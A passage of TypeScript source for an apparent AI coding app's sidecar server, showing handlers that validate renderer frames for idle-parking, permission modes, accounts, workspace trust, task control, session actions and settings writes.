   * boundary `bad_request` for a malformed frame (the security tax).
   *
   * The gate (three synchronous reads) + latch + re-verify are the R2-F2 crux:
   * because the sidecar dispatches one frame at a time synchronously (JS single-
   * thread), park and submit cannot interleave WITHIN a dispatch — only whole
   * dispatches interleave. So a turn/permission accepted in an EARLIER dispatch
   * is already visible to the gate here and aborts the park (not the turn); a
   * submit in a LATER dispatch sees `parking` and is rejected (handleSubmit).
   */
  private handlePark(connection: Connection, rawMessage: unknown): void {
    const parsed = appParkMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      // A malformed park is a boundary rejection like any other frame. Use
      // `undefined` requestId — the field it carries is not trustworthy here.
      this.sendError(
        connection,
        undefined,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid app.park',
        false,
      )
      return
    }

    // Park unwired (probe fixture) ⇒ nothing to exit; decline rather than wedge.
    if (!this.onPark) return
    // Already latched ⇒ this process is exiting; a second park is a no-op.
    if (this.parking) return
    // Gate: refuse over any active work (no turn loss / no dropped permission).
    if (!this.isParkGateOpen()) return
    // Latch, then re-verify the same gate (belt-and-suspenders: trivially still
    // true under single-thread, but it makes the invariant explicit and future-
    // proofs against an `await` creeping into the gate reads).
    this.parking = true
    if (!this.isParkGateOpen()) {
      this.parking = false
      return
    }
    // Flush + exit. `onPark` (index.ts) runs cleanup() then process.exit(
    // PARKED_EXIT_CODE); nothing happens after it. There is no frame after this.
    this.onPark()
  }

  /**
   * IDLE-PARK (decisions/IDLE-PARK.md §3) — the three-gate park check, all
   * synchronous reads of authoritative live state:
   *   1. no active turn (`activeTurn`, set sync in handleSubmit before the async
   *      submit starts, so it is true the instant a turn is accepted);
   *   2. no pending permission (`controller.getPendingPermissionRequests()` — the
   *      engine's own live list; a pending permission DIES unrecoverably by
   *      design (T5a), so never park over one);
   *   3. no running/pending task, read from the SAME tasks domain the server
   *      already holds. `hasLiveWork()` reads the RAW task store, FOREGROUND-
   *      inclusive — NOT the display snapshot, which filters out a foregrounded
   *      local_agent (parking over a running foregrounded agent-mode worker would
   *      kill a live turn — a no-turn-loss breach). Covers background + foreground
   *      workers alike. Do not re-derive.
   *
   * Two more gates, same rule (no half-finished durable write):
   *   4. no accepted verb whose durable write is still in flight. A token
   *      refresh holds a cross-process lockfile and marks the vault record
   *      `in_flight` before a 15 s network call
   *      (`src/services/api/codexTokenRefresh.ts`); exiting there orphans the
   *      lock and gets the account quarantined by the next refresher, with no
   *      auth failure anywhere. A fork's transcript write has the same shape.
   *   5. no OAuth sign-in under way. That verb returns immediately and the
   *      real flow (browser + callback listener + credential write) continues
   *      in the background, so the counter above cannot see it; the domain
   *      reports its own liveness instead.
   */
  private isParkGateOpen(): boolean {
    if (this.activeTurn) return false
    if (this.hasQueuedParentTaskNotification()) return false
    // Same rule for a prompt the user sent mid-turn that no tool round drained:
    // parking over it would strand a message the user has already watched leave
    // the composer.
    if (this.hasQueuedParentPrompt()) return false
    if (this.controller.getPendingPermissionRequests().length > 0) return false
    if (this.tasks && this.tasks.hasLiveWork()) return false
    if (this.inFlightDurableWrites > 0) return false
    if (this.accounts?.isOAuthLoginInFlight()) return false
    return true
  }

  /**
   * C2 — `permission.setMode` (decisions/PERMISSION-BOUNDARY.md §3).
   * Fail-closed order: explicit escalation rejections → local schema →
   * capability presence → apply. The apply is session-scoped by construction
   * (no destination exists on the wire; nothing here can reach
   * `permissions.defaultMode`). Success is acknowledged by the resulting
   * `permission.context` snapshot; a same-mode no-op emits nothing.
   */
  private handleSetMode(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown; mode?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    // Auto remains fail-closed: the sidecar asks the live engine gate, which
    // covers model support, settings disablement and the circuit breaker.
    if (
      raw.mode === 'auto' &&
      this.permissions?.getDisplayFacts().permissionClassifierEnabled !== true
    ) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        'mode "auto" is not available for this session',
        false,
      )
      return
    }

    const parsed = permissionSetModeMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid permission.setMode message',
        false,
      )
      return
    }

    if (!this.permissions) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'permission domain unavailable for this session',
        false,
      )
      return
    }

    // `bypassPermissions` is an escalation beyond the renderer-mediated
    // permission flow. The renderer may request it only when the trusted
    // launch-time capability enabled it for this session; it must never be
    // able to grant that capability by sending this frame.
    if (
      parsed.data.mode === 'bypassPermissions' &&
      this.permissions.getToolPermissionContext().isBypassPermissionsModeAvailable !== true
    ) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'bad_request',
        'mode "bypassPermissions" is not available for this session',
        false,
      )
      return
    }

    try {
      this.permissions.setMode(parsed.data.mode)
    } catch (error) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        error instanceof Error ? error.message : String(error),
        false,
      )
    }
  }

  private handleStatsQuery(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = statsQueryMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid stats query',
        false,
      )
      return
    }

    void this.sendUsageStatsSnapshot(connection, parsed.data.range)
  }

  /**
   * P4-5 — account lifecycle verbs (protocol.ts: the decision rationale lives on
   * `ACCOUNT_VERB_TYPES`). Fail-closed order: sidecar-LOCAL structural schema →
   * domain presence → pool-RESOLVED business validation + dispatch (in the
   * domain) → `account.result` frame → re-broadcast the snapshot when the pool
   * changed. Structural validation here NEVER trusts the renderer's account
   * state: it checks shape only; the domain re-resolves the target against the
   * live pool (T6) and re-validates aliases with the engine's own rule. No token
   * crosses either direction.
   */
  private handleAccountVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = accountVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid account verb',
        false,
      )
      return
    }
    if (!this.accounts) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'accounts domain unavailable for this session',
        false,
      )
      return
    }

    // The verb is now structurally valid; the domain owns the pool-resolved
    // business rules + dispatch. Errors there degrade to an ok:false result
    // frame (a business failure), never a thrown internal error to the client.
    const verb = parsed.data as AccountVerbMessage
    // IDLE-PARK gate 4: hold the park off until this settles (see isParkGateOpen).
    this.inFlightDurableWrites += 1
    void this.accounts
      .runVerb(verb)
      .then(({ verb: verbType, result, poolChanged }) => {
        this.send(connection, {
          kind: 'account.result',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          requestId: verb.requestId,
          verb: verbType,
          ok: result.ok,
          message: result.message,
          ...(result.touchAllResults !== undefined
            ? { touchAllResults: result.touchAllResults }
            : {}),
        })
        if (poolChanged) {
          this.broadcastAccountsSnapshot()
          // Account/credential changes can change getModelOptions() (notably
          // adding/removing Anthropic subscription access), even though no
          // model/effort/fast store field moved.
          this.broadcastRunControlsSnapshot()
          void this.refreshSettingsSnapshot()
        }
      })
      .catch(error => {
        this.sendError(
          connection,
          verb.requestId,
          'internal_error',
          error instanceof Error ? error.message : String(error),
          false,
        )
      })
      .finally(() => {
        this.inFlightDurableWrites -= 1
      })
  }

  private handleAccountProfileDeleted(
    connection: Connection,
    rawMessage: unknown,
  ): void {
    const parsed = accountProfileDeletedMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        undefined,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid account deletion notice',
        false,
      )
      return
    }
    if (!this.accounts) return

    this.inFlightDurableWrites += 1
    void this.accounts
      .applyDeletedProfile(parsed.data.accountId)
      .then(changed => {
        if (!changed) return
        this.broadcastAccountsSnapshot()
        this.broadcastRunControlsSnapshot()
        void this.refreshSettingsSnapshot()
      })
      .catch(error => {
        this.sendError(
          connection,
          parsed.data.requestId,
          'internal_error',
          error instanceof Error ? error.message : String(error),
          false,
        )
      })
      .finally(() => {
        this.inFlightDurableWrites -= 1
      })
  }

  /**
   * P4-15 — the workspace-trust accept verb (protocol.ts: WORKSPACE_TRUST_VERB_TYPES;
   * `docs/migration/decisions/STARTUP-GATES.md §1.1`). Same fail-closed order as `handleAccountVerb`:
   * sidecar-LOCAL structural schema → domain presence → dispatch to the domain
   * (which persists via the engine's OWN `saveCurrentProjectConfig` for THIS
   * session's cwd — HC1, no renderer path) → `workspace.trust.result` frame →
   * re-broadcast the `workspace-trust.snapshot` when the store changed. No token
   * crosses either direction (trust is a boolean).
   */
  private handleWorkspaceTrustVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = workspaceTrustMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid workspace-trust verb',
        false,
      )
      return
    }
    if (!this.workspaceTrust) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'workspace-trust domain unavailable for this session',
        false,
      )
      return
    }

    const result = this.workspaceTrust.acceptTrust()
    this.send(connection, {
      kind: 'workspace.trust.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: parsed.data.requestId,
      ok: result.ok,
      message: result.message,
    })
    if (result.changed) {
      this.broadcastWorkspaceTrustSnapshot()
      this.scheduleBoundaryDrain()
    }
  }

  /**
   * P4-8b — the agent-mode set verb (protocol.ts: AGENT_MODE_VERB_TYPES;
   * `decisions/AGENT-MODE-TOGGLE.md`). Same fail-closed order as
   * `handleWorkspaceTrustVerb`: sidecar-LOCAL structural schema → domain presence
   * → dispatch to the domain (which switches mode through the engine's OWN
   * `matchSessionMode` — a live env switch, no respawn) → `agent-mode.set.result`
   * frame → re-broadcast the `agent-mode.snapshot` when the mode changed. The
   * renderer authors only the boolean intent; no path, no token crosses.
   */
  private handleAgentModeSet(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = agentModeSetMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid agent-mode verb',
        false,
      )
      return
    }
    if (!this.agentMode) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'agent-mode domain unavailable for this session',
        false,
      )
      return
    }

    const result = this.agentMode.setActive(parsed.data.active)
    this.send(connection, {
      kind: 'agent-mode.set.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: parsed.data.requestId,
      ok: result.ok,
      message: result.message,
    })
    // The snapshot broadcast is async (the session plane is a file-backed engine
    // read); fire-and-forget after the synchronous result ack, mirroring the
    // subscribe-driven re-broadcast path.
    if (result.changed) {
      void this.broadcastAgentModeSnapshot()
    }
  }

  /**
   * P4-8b — the task-control STOP verb (protocol.ts: TASK_CONTROL_VERB_TYPES;
   * `decisions/AGENT-CHROME.md` §2 / PARITY-LEDGER §20 "WorkerDetail Stop"). Same
   * fail-closed order as the other verbs: sidecar-LOCAL structural schema → domain
   * presence → dispatch to the domain (which runs the engine's OWN `stopTask`
   * against THIS session's store — a live kill, no respawn) → `task-control.result`
   * frame. The `tasks.snapshot` / `agent-mode.snapshot` re-broadcast is NOT emitted
   * here: `stopTask` mutates the app-state store, whose subscription (constructor)
   * re-broadcasts the fresh snapshots to every connection — the SAME live path any
   * engine-side kill takes, not an action-driven synthetic one. Async because
   * `stopTask` is async; the result frame follows the awaited kill. The renderer
   * authors ONLY the target `taskId`; the engine re-resolves it against the live
   * store, so an unknown/terminal target fails closed with `ok:false` (no crash).
   *
   * `task.dismiss` (CC-32 follow-up) rides the identical path with the identical
   * shape; only the domain call differs, and its refusals (unknown / still running
   * / not a panel worker) are decided against the same live store.
   */
  private async handleTaskControlVerb(
    connection: Connection,
    rawMessage: unknown,
  ): Promise<void> {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = taskControlVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid task-control verb',
        false,
      )
      return
    }
    if (!this.taskControl) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'task-control domain unavailable for this session',
        false,
      )
      return
    }

    const verb = parsed.data as TaskControlVerbMessage
    const result =
      verb.type === 'task.background'
        ? await this.taskControl.background()
        : verb.type === 'task.background.one'
          ? await this.taskControl.backgroundOne(verb.toolUseId)
          : verb.type === 'task.dismiss'
            ? await this.dismissWorker(verb.taskId)
            : await this.taskControl.stop(verb.taskId)
    this.send(connection, {
      kind: 'task-control.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: verb.requestId,
      verb: verb.type,
      ok: result.ok,
      message: result.message,
    })
    // No explicit snapshot re-broadcast here — on a successful stop, `stopTask`
    // mutated the store, and the tasks/agent-mode store-subscriptions (constructor)
    // re-emit `tasks.snapshot` / `agent-mode.snapshot` with the task now `killed`.
    // A dismiss needs one more step, which `dismissWorker` owns.
  }

  /**
   * The two-plane half of a dismiss (CC-32 follow-up). `taskControl` can only see
   * the LIVE `AppState.tasks`, but a worker's roster row has a second source: the
   * persisted agent-mode plane, which `agentModeSnapshot` unions in whenever no
   * live worker MASKS it by handle (`agentModeDomain.ts` union policy). Retiring
   * the row therefore takes both planes, and only this layer sees both.
   *
   * `not_found` is consequently NOT a failed dismiss. It means nothing live holds
   * the row, which leaves the persisted twin as the only thing still rendering it
   * — exactly what the suppression below retires. Treating it as a refusal made
   * the control dead on the commonest shape there is: `readSessionState` stamps
   * `origin: worker.origin ?? 'current'` (`src/agent-mode/sessionState.ts:672`), so
   * every worker the reaper has already evicted comes back as a persisted row that
   * looks current, offers Dismiss, and refused it. `still_running` and
   * `unsupported_type` stay refusals: there the engine holds real state, and
   * hiding a row it still owns would be a display lie.
   *
   * The explicit re-broadcast is required rather than redundant: on this path no
   * store mutation happens at all, so no subscription fires and nothing else would
   * carry the suppression to the renderer.
   */
  private async dismissWorker(taskId: string): Promise<TaskDismissResult> {
    if (!this.taskControl) {
      return { ok: false, message: 'Could not dismiss the worker.' }
    }
    const result = await this.taskControl.dismiss(taskId)
    const retiresRow = result.ok || result.refusal === 'not_found'
    if (!retiresRow || !this.agentMode) {
      return result
    }
    this.agentMode.noteWorkerDismissed(taskId)
    void this.broadcastAgentModeSnapshot()
    return result.ok ? result : { ok: true, message: 'Dismissed worker.' }
  }

  /**
   * P4-24c — the composer run-control set verbs (protocol.ts: RUN_CONTROL_VERB_TYPES;
   * `decisions/COMPOSER-RUN-CONTROLS.md`). Same fail-closed order as the other verbs:
   * sidecar-LOCAL structural schema → domain presence → dispatch to the domain
   * (which runs the engine's OWN `/model`/`/effort`/`/fast` setter — a live change,
   * no respawn) → `run-control.result` frame. The `run-controls.snapshot`
   * re-broadcast is NOT emitted here: the setter mutates the app-state store, whose
   * change-detected subscription (constructor) re-broadcasts the fresh snapshot to
   * every connection — the SAME path any engine-side model/effort/fast change takes
   * (proving a real live frame, not an action-driven synthetic one). The renderer
   * authors ONLY the value/selection; no engine object, no path, no token crosses.
   */
  private handleRunControlVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = runControlVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid run-control verb',
        false,
      )
      return
    }
    if (!this.runControls) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'run-controls domain unavailable for this session',
        false,
      )
      return
    }

    const verb = parsed.data as RunControlVerbMessage
    let result: { ok: boolean; message: string; changed: boolean }
    switch (verb.type) {
      case 'model.set':
        result = this.runControls.setModel(verb.model)
        break
      case 'effort.set':
        result = this.runControls.setEffort(verb.effort)
        break
      case 'fast.set':
        result = this.runControls.setFast(verb.active)
        break
    }

    this.send(connection, {
      kind: 'run-control.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: verb.requestId,
      verb: verb.type,
      ok: result.ok,
      message: result.message,
    })
    // No explicit snapshot re-broadcast here — the setter's store mutation drives
    // the change-detected subscription, which re-emits `run-controls.snapshot`.
  }

  /**
   * P4-6b — the session-action WRITE verbs (protocol.ts: SESSION_ACTION_VERB_TYPES).
   * Same fail-closed order as the other verbs: sidecar-LOCAL structural schema →
   * domain presence → dispatch to the engine's OWN op (saveCustomTitle /
   * renderMessagesToPlainText / saveTag — P4-29 added the last one on
   * this same closed set) → `session-action.result` frame echoing
   * the requestId (T5a-analog). The domain ops are async (disk reads/writes), so the
   * ack fires after the promise resolves; the domain degrades every failure to an
   * `{ok:false, message}` result rather than throwing. On a successful RENAME the
   * server ALSO reuses the existing `session-title` outbound frame
   * (`broadcastSessionTitle` → main tap → `host.setTitle` → registry) so the
   * sidebar/tab relabel live — no new registry seam. The renderer authors ONLY the
   * intent (a title string on rename); no engine object, path, or token crosses.
   */
  private handleSessionActionVerb(
    connection: Connection,
    rawMessage: unknown,
  ): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = sessionActionVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid session-action verb',
        false,
      )
      return
    }
    if (!this.sessionActions) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'session-actions domain unavailable for this session',
        false,
      )
      return
    }

    const verb: SessionActionVerbMessage = parsed.data
    const domain = this.sessionActions
    if (
      verb.type === 'session.editFromMessage' ||
      verb.type === 'session.branchFromMessage'
    ) {
      this.handleMessageTargetedSessionAction(connection, verb, domain)
      return
    }
    // The op verb short name echoed on the result frame (protocol.ts).
    const verbName: 'rename' | 'export' | 'branch' | 'tag' =
      verb.type === 'session.rename'
        ? 'rename'
        : verb.type === 'session.export'
          ? 'export'
          : verb.type === 'session.branch'
            ? 'branch'
            : 'tag'

    const run =
      verb.type === 'session.rename'
        ? domain.rename(verb.title)
        : verb.type === 'session.export'
          ? domain.export()
          : verb.type === 'session.branch'
            ? domain.branch()
            : domain.tag(verb.tag)

    // IDLE-PARK gate 4: a fork writes a new transcript, so hold the park off
    // until this settles (see isParkGateOpen).
    this.inFlightDurableWrites += 1
    void run
      .then(result => {
        // Export can produce a very large transcript. The outbound size cap
        // (`send`) would DROP an over-cap frame silently → a hung UI; instead fail
        // closed with an honest ok:false. Bound the text alone, leaving headroom for
        // the rest of the frame + framing overhead (F3, MAX_OUTBOUND_FRAME_BYTES).
        if (
          result.ok &&
          result.exportText !== undefined &&
          Buffer.byteLength(result.exportText, 'utf8') >
            MAX_OUTBOUND_FRAME_BYTES - 64 * 1024
        ) {
          this.send(connection, {
            kind: 'session-action.result',
            protocolVersion: PROTOCOL_VERSION,
            sessionId: this.sessionId,
            requestId: verb.requestId,
            verb: verbName,
            ok: false,
            message:
              'Transcript is too large to export from the app. Use /export in the terminal.',
          })
          return
        }

        this.send(connection, {
          kind: 'session-action.result',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          requestId: verb.requestId,
          verb: verbName,
          ok: result.ok,
          message: result.message,
          ...(result.exportText !== undefined
            ? { exportText: result.exportText }
            : {}),
          ...(result.branchEngineSessionId !== undefined
            ? { branchEngineSessionId: result.branchEngineSessionId }
            : {}),
          ...(result.branchTitle !== undefined
            ? { branchTitle: result.branchTitle }
            : {}),
        })

        // A successful rename relabels the sidebar/tab live by reusing the existing
        // one-shot title outbound path (main taps it → host.setTitle → registry).
        if (verb.type === 'session.rename' && result.ok) {
          this.broadcastSessionTitle(verb.title.trim())
        }
      })
      .catch(error => {
        // Defense in depth: the domain already degrades failures to ok:false, but a
        // rejected promise here still owes the renderer a correlated result.
        this.send(connection, {
          kind: 'session-action.result',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          requestId: verb.requestId,
          verb: verbName,
          ok: false,
          message: `Session action failed: ${
            error instanceof Error ? error.message : String(error)
          }`,
        })
      })
      .finally(() => {
        this.inFlightDurableWrites -= 1
      })
  }

  private handleMessageTargetedSessionAction(
    connection: Connection,
    verb: Extract<
      SessionActionVerbMessage,
      { type: 'session.editFromMessage' | 'session.branchFromMessage' }
    >,
    domain: SidecarSessionActionsDomain,
  ): void {
    const verbName =
      verb.type === 'session.editFromMessage'
        ? 'editFromMessage'
        : 'branchFromMessage'
    const refuse = (message: string): void => {
      this.sendSessionActionResult(connection, {
        kind: 'session-action.result',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        requestId: verb.requestId,
        verb: verbName,
        ok: false,
        message,
      })
    }

    if (this.parking || this.conversationMutationInFlight) {
      refuse('Another conversation update is already in progress.')
      return
    }
    if (
      verb.type === 'session.editFromMessage' &&
      (this.hasQueuedParentPrompt() || this.stagedPrompts.size > 0)
    ) {
      refuse('Send or recall waiting messages before editing this conversation.')
      return
    }
    if (
      verb.type === 'session.branchFromMessage' &&
      (this.activeTurn || this.controller.isTurnActive())
    ) {
      refuse('Wait for the current response to finish before branching.')
      return
    }

    const selected = domain.selectUserMessage(verb.userMessageId)
    if (!selected.ok || selected.selectedPrompt === undefined) {
      refuse(selected.message)
      return
    }
    const preflight: SessionActionResultFrame = {
      kind: 'session-action.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: verb.requestId,
      verb: verbName,
      ok: true,
      message: 'Conversation action completed.',
      ...(verb.type === 'session.branchFromMessage'
        ? {
            branchEngineSessionId: '00000000-0000-4000-8000-000000000000',
            branchTitle: 'x'.repeat(128),
          }
        : {}),
      selectedPrompt: selected.selectedPrompt,
    }
    if (!this.canSendSessionActionResult(preflight)) {
      refuse('The selected prompt is too large or unsafe to return in the app.')
      return
    }

    this.conversationMutationInFlight = true
    this.inFlightDurableWrites += 1
    void (async () => {
      if (verb.type === 'session.editFromMessage') {
        if (this.activeTurn || this.controller.isTurnActive()) {
          this.controller.abort('Editing from an earlier message')
          await this.controller.waitUntilIdle()
        }
        const result = await domain.editFromMessage(verb.userMessageId)
        if (!result.ok) {
          refuse(result.message)
          return
        }
        if (
          !result.retainedMessages ||
          !this.projectHistory
        ) {
          refuse('Conversation history could not be rebuilt after editing.')
          return
        }
        const projected = await this.projectHistory(result.retainedMessages)
        this.history = projected.history
        this.historySourceTruncated = projected.truncated
        this.broadcastTranscriptResetAndReplay()
        this.sendSessionActionResult(connection, {
          kind: 'session-action.result',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          requestId: verb.requestId,
          verb: verbName,
          ok: true,
          message: result.message,
          selectedPrompt: selected.selectedPrompt,
        })
        return
      }

      const result = await domain.branchFromMessage(verb.userMessageId)
      if (
        result.ok &&
        (!result.branchEngineSessionId ||
          !result.branchTitle)
      ) {
        refuse('The branch was created without complete trusted output.')
        return
      }
      this.sendSessionActionResult(connection, {
        kind: 'session-action.result',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        requestId: verb.requestId,
        verb: verbName,
        ok: result.ok,
        message: result.message,
        ...(result.branchEngineSessionId !== undefined
          ? { branchEngineSessionId: result.branchEngineSessionId }
          : {}),
        ...(result.branchTitle !== undefined
          ? { branchTitle: result.branchTitle }
          : {}),
        selectedPrompt: selected.selectedPrompt,
      })
    })()
      .catch(error => {
        refuse(
          `Session action failed: ${
            error instanceof Error ? error.message : String(error)
          }`,
        )
      })
      .finally(() => {
        this.conversationMutationInFlight = false
        this.inFlightDurableWrites -= 1
        this.scheduleBoundaryDrain()
      })
  }

  private broadcastTranscriptResetAndReplay(): void {
    for (const connection of this.connections) {
      this.send(connection, {
        kind: 'transcript.reset',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
      })
      this.sendHistoryReplay(connection)
    }
  }

  private sendSessionActionResult(
    connection: Connection,
    frame: SessionActionResultFrame,
  ): void {
    if (!this.canSendSessionActionResult(frame)) {
      this.send(connection, {
        kind: 'session-action.result',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        requestId: frame.requestId,
        verb: frame.verb,
        ok: false,
        message:
          'The conversation changed, but the selected prompt is too large to return in the app.',
      })
      return
    }
    this.send(connection, frame)
  }

  private canSendSessionActionResult(frame: SessionActionResultFrame): boolean {
    const prepared = this.prepareOutboundPayload(
      frame,
      'session-action.result',
      'preflight',
    )
    if (!prepared) return false
    const secret = scanForSecrets(prepared)
    if (!secret.ok) {
      this.log(
        `[sidecar] blocked unsafe selected prompt at ${secret.path}`,
      )
      this.onFrameDropped?.('secret_key', frame.kind)
      return false
    }
    return encodeFrame(prepared).byteLength <= this.sessionActionResultMaxBytes
  }

  /**
   * P4-13 — RemoteSettings verbs (protocol.ts: the decision rationale lives on
   * `REMOTE_VERB_TYPES`). Same fail-closed order as `handleAccountVerb`:
   * sidecar-LOCAL structural schema → domain presence → dispatch (the domain
   * re-checks the live bridge flag before mutating) → `remoteSettings.result`
   * frame → re-broadcast the snapshot when the bridge flag changed.
   */
  private handleRemoteSettingsVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = remoteVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid remote settings verb',
        false,
      )
      return
    }
    if (!this.remoteSettings) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'remote settings domain unavailable for this session',
        false,
      )
      return
    }

    const verb = parsed.data as RemoteVerbMessage
    void this.remoteSettings
      .runVerb(verb)
      .then(({ verb: verbType, result, flagChanged }) => {
        this.send(connection, {
          kind: 'remoteSettings.result',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          requestId: verb.requestId,
          verb: verbType,
          ok: result.ok,
          message: result.message,
          ...(result.directConnect !== undefined
            ? { directConnect: result.directConnect }
            : {}),
        })
        if (flagChanged) {
          this.broadcastRemoteSettingsSnapshot()
        }
      })
      .catch(error => {
        this.sendError(
          connection,
          verb.requestId,
          'internal_error',
          error instanceof Error ? error.message : String(error),
          false,
        )
      })
  }

  /**
   * P4-19 — the FIRST renderer→engine settings write. Fail-closed order:
   * sidecar-LOCAL Zod schema (shape + editable-source enum + bounded key/value)
   * → per-key value-type check against the closed EDITABLE_SETTINGS allowlist →
   * domain presence → domain.runVerb (which applies the engine's
   * SettingsUpdater-under-lock write) → `settings.result` frame → re-broadcast a
   * fresh `settings.snapshot` when the write landed. The renderer never authors
   * an engine object: it names a `{ source, key, value }`, and every one is
   * re-validated here at the trust boundary before disk is touched.
   */
  private handleSettingsVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = settingsVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid settings verb',
        false,
      )
      return
    }
    const verb = parsed.data as SettingsVerbMessage

    // Per-key gate (the strict-key allowlist for the VALUE): the key must be in
    // the closed allowlist, and then either the request is a CLEAR (`value ===
    // null`, P4-41) or the value must match the key's control type — a boolean
    // key rejects a string, an enum key rejects an out-of-set value, an int key
    // rejects a non-integer/out-of-range number. Rejected at the boundary, never
    // written.
    const valueCheck = validateEditableSettingWrite(verb.key, verb.value)
    if (!valueCheck.ok) {
      this.sendError(connection, verb.requestId, 'bad_request', valueCheck.error, false)
      return
    }

    if (!this.settings) {
      this.sendError(
        connection,
        verb.requestId,
        'internal_error',
        'settings domain unavailable for this session',
        false,
      )
      return
    }

    let result: { ok: boolean; message: string; changed: boolean }
    try {
      result = this.settings.runVerb(verb)
    } catch (error) {
      this.sendError(
        connection,
        verb.requestId,
        'internal_error',
        error instanceof Error ? error.message : String(error),
        false,
      )
      return
    }

    this.send(connection, {
      kind: 'settings.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: verb.requestId,
      verb: verb.type,
      ok: result.ok,
      message: result.message,
    })
    if (result.changed) {
      this.broadcastSettingsSnapshot()
    }
  }

  private handlePermissionResponse(
    connection: Connection,
    message: PermissionResponseMessage,
    rawMessage: unknown,
  ): void {
    // T5a (structural) — the requestId MUST match a currently-pending
    // engine-minted request. `respondToPermissionRequest` no-ops on a miss
    // (AppSessionController.ts:91-96); we check first to answer with a precise
    // error instead of a silent drop. There is no path that lets the renderer
    // register a pending request.
    const pending = this.controller
      .getPendingPermissionRequests()
      .find(request => request.requestId === message.requestId)
    if (!pending) {
      this.sendError(
        connection,
        message.requestId,
        'permission_not_found',
        'Permission request is no longer pending',
        false,
      )
      return
    }

    // C1 — "always allow" as suggestion SELECTION (PERMISSION-BOUNDARY.md). The
